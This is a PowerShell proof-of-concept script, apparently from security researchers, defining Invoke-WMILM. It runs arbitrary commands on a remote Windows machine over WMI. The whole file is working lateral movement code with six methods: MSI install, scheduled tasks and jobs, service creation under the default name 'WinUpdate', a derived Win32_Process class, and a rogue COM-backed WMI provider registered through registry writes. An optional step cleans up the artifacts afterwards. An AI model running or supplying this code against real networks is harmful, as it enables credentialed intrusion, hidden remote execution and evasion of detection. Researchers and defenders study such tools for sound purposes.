<#
 Proof of Concept for Alternative WMI Lateral Movenent Methods
    Copyright (C) 2018 Cybereason

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
   
    Author: Philip Tsukerman
#>


function Invoke-WMILM {
<#
    .DESCRIPTION
    Run code on a remote machine, without (at least directly) using the Win32_Process class

    .PARAMETER Target
    Hostname or IP of the target machine

    .PARAMETER Type
    The Type of technique to be used

    .PARAMETER Name
    Supplies fields such as service name, to techniques needing it

    .PARAMETER Command
    Executable to run

    .PARAMETER CommandArgs
    Arguments to the executable

    .PARAMETER CleanUp
    Should we try to clean up artifacts created on the target machine?

    .PARAMETER Username
    Username for target machine

    .PARAMETER Password
    Password for target machine 
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $Target,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet("Product", "Service", "Job", "Task", "Provider", "DerivedProcess")]
        [String]
        $Type = "Service",

        [Parameter(Mandatory = $false, Position = 2)]
        [String]
        $Name = "WinUpdate",

        [Parameter(Mandatory = $false, Position = 3)]
        [String]
        $Command,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]
        $CommandArgs,

        [Parameter(Mandatory = $false, Position = 5)]
        [Bool]
        $CleanUp = $false,

        [Parameter(Mandatory = $true, Position = 6)]
        [string]
        $Username,

        [Parameter(Mandatory = $true, Position = 7)]
        [string]
        $Password
    )
    
    
    Process {

        # Create a remote CIM session
        $SecurePass = ConvertTo-SecureString -String $Password -asplaintext -force
        $cred = new-object -typename System.Management.Automation.PSCredential -ArgumentList @($Username, $SecurePass)
        $Opt = New-CimSessionOption -Protocol "DCOM"
        $Session = New-Cimsession -ComputerName $Target -SessionOption $Opt -Credential $Cred

        # Lateral movement using the Win32_Product class. Command needs to be a path to an msi file on the victim
        if ($Type -Match "Product") {
            Write-Host "Installing package '$Command'"
            $Result =  Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = $Command; Options = ""; AllUsers = $false}
            
            if ($Result.ReturnValue -ne 1603){
            Write-Warning "Failed to install package. ERROR: $($Result.ReturnValue) "
            break
           }
        }

        # Lateral movement using the PS_ScheduledTask classes. Enabling cleanup deletes the task after running. Requires Win8+
        elseif ($Type -Match "Task") {
            Try {
                Write-Host "Creating scheduled task names $Name with command '$Command $CommandArgs'"
                $Action = New-ScheduledTaskAction -Execute $Command -Argument $CommandArgs -WorkingDirectory "c:\windows\system32" -CimSession = $Session
                Register-ScheduledTask -Action $Action -TaskName $Name -CimSession $Session
                Start-ScheduledTask -TaskName $Name

                if ($Cleanup -eq $true) {
                    Unregister-ScheduledTask -TaskName $Name -Confirm:$false -CimSession $Session
                }
            }

            Catch {
                Write-Warning "Task creation failed. Are you sure target is Win8+?"
                break
            }
            
        }

        # Lateral movement using the Win32_ScheduledJob class. Enabling cleanup deletes the task after running. Does not work on Win8+
        elseif ($Type -Match "Job") {
            $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_ScheduledJob -MethodName Create -Arguments @{Command="$Command $CommandArgs"; StartTime=(Get-Date).AddSeconds(30)}
            Write-Host "Creating scheduled job with command '$Command $CommandArgs' to run in 30 seconds"

            if ($Result.ReturnValue -eq 8) {
                Write-Warning "Scheduled job creation failed. Are you sure at.exe is supported on target machine?"
                break
            }

            if ($result.ReturnValue -ne 0) {
                Write-Warning "Scheduled job creation failed. Error $($Result.ReturnValue)"
                break   
            }

            if ($Cleanup -eq $true) {
                Write-Host "Sleeping to let the task execute, and then deleting it"
                Start-Sleep 30
                Invoke-CimMethod -InputObject (Get-CimInstance -CimSession $Session -Query "SELECT * FROM Win32_ScheduledJob WHERE JobId = $($Result.JobId)") -MethodName Delete
            }
        }

        # Lateral movement using the Win32_Service class. Enabling cleanup deletes the service after running
        elseif ($Type -Match "Service") {
            Write-Host "Creating and running a new service with name $Name and command '$Command $CommandArgs'"
            $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = $Name; DisplayName = $Name; PathName = "$Command $CommandArgs"; ServiceType = [byte]::Parse("16"); StartMode = "Manual"}

            if ($Result.ReturnValue -ne 0) {
             Write-Warning "Service creation failed. Error $($Result.ReturnValue)"
                break      
            }
            $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$Name'"
            Invoke-CimMethod -InputObject $Service -MethodName StartService

             if ($Cleanup -eq $true) {
                Write-Host "Deleting service"
                Invoke-CimMethod -InputObject $Service -MethodName StopService
                Invoke-CimMethod -InputObject $Service -MethodName Delete
             }
        }

        # Lateral movement by derivation from the Win32_Process class. New class name will be the $Name parameter prefixed with 'Win32_'
        elseif ($Type -Match "DerivedProcess") {
            Write-Host "Creating a subclass of Win32_Process named Win32_$Name"
            $Options = New-Object Management.ConnectionOptions
            $Options.Username = $Username
            $Options.Password = $Password
            $Options.EnablePrivileges = $True
            $Connection = New-Object Management.ManagementScope
            $Connection.Path = "\\$Target\root\cimv2"
            $Connection.Options = $Options
            $Connection.Connect()
            $Path = New-Object Management.ManagementPath("Win32_Process")
            $Class = New-Object Management.ManagementClass($Connection, $Path, $null)
            $NewClass = $Class.Derive("Win32_$Name")
            $NewClass.Put()
            Write-Host "Using Win32_$Name to create a new process with command line '$Command $CommandArgs'"
            $Result = Invoke-CimMethod -CimSession $Session -ClassName "Win32_$Name" -MethodName Create -Arguments @{CommandLine = "$Command $CommandArgs"}

            if ($Result.ReturnValue -ne 0){
                Write-Warning "Could not create process. ERROR $($Result.ReturnValue)"
            }
        }

        # Lateral movement using WMI provider registration. Cleanup option removes the provider instance and the associated COM object
        elseif ($Type -Match "Provider") {

            [UInt32]$Hklm = 2147483650 # Int represenation of the HKLM hive
            $Guid = ([Guid]::NewGuid()).Guid.ToUpper()
            $Key = "SOFTWARE\Classes\CLSID\{$Guid}"
            echo $Key
            $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}

            if ($Result.ReturnValue -ne 0){
                Write-Warning "Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)"
                break
            }

            $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = ""; sValue = "$Name"}

            $Key = "SOFTWARE\Classes\CLSID\{$Guid}\LocalServer32"
            echo $key
            $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName CreateKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}

            if ($Result.ReturnValue -ne 0){
                Write-Warning "Could not create key $Key in HKLM. ERROR $($Result.ReturnValue)"
                break
            }

            $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName SetStringValue -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key; sValueName = ""; sValue = "$Command $CommandArgs"}

            $Prov = New-CimInstance -CimSession $Session -ClassName __Win32Provider -Arguments @{CLSID = "{$Guid}"; Name = $Name}
            Invoke-CimMethod -CimSession $Session -ClassName Msft_Providers -MethodName Load -Arguments @{Namespace = "root/CIMV2"; Provider="$Name"}

            if ($Cleanup -eq $true) {
                Remove-CimInstance -InputObject $Prov
                $Result = Invoke-CimMethod -CimSession $Session -ClassName StdRegProv -MethodName DeleteKey -Arguments @{hDefKey = $Hklm; sSubKeyName = $Key}
            }

        }
    }

    End {
        Write-Output "The End!"
    }
}
